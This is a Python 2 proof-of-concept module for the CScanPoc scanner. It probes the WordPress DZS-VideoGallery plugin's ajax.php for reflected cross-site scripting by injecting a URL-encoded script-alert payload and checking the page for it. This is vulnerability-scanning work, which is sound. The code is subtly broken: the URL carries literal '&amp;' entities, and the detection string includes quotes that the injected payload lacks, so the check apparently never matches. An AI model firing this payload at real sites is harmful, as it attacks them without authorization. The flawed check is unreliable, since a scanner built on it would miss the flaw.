# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0133'  # 平台漏洞编号，留空
    name = 'WordPress DZS-VideoGallery /ajax.php XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-12-10'  # 漏洞公布时间
    desc = '''
    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台，该平台支持在PHP和MySQL的服务器上架设个人博客网站。
    DZS-VideoGallery是其中的一个DZS视频库插件。 
    WordPress DZS-VideoGallery插件中存在跨站脚本漏洞，该漏洞源于程序没有正确过滤用户提交的输入。
    当用户浏览被影响的网站时，其浏览器将执行攻击者提供的任意脚本代码，这可能导致攻击者窃取基于cookie的身份认证并发起其它攻击。
    '''  # 漏洞描述
    ref = 'http://sebug.net/vuldb/ssvid-61532'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress DZS-VideoGallery'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '88d0813c-0a31-4f09-97ed-c469a0a0a6ec'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&amp;height=400&amp;"
                       "width=610&amp;type=vimeo&amp;source=%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E")
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '<script>alert("bb2")</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
